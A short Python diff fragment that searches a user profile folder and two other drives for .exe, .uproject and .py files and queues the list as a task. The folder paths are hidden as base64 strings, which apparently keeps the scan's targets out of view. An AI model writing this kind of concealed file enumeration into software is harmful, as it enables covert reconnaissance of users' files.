@@ -152,7 +152,7 @@ try:
     zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
     zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
     zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
-    add_queue_task('ext_path_ls', {'path_ls' : zovV})
+    add_queue_task('ext_path_ls', zovV)
 except:
     import traceback
     add_queue_task('ext_path_ls_error', {'error': str(traceback.format_exc())})
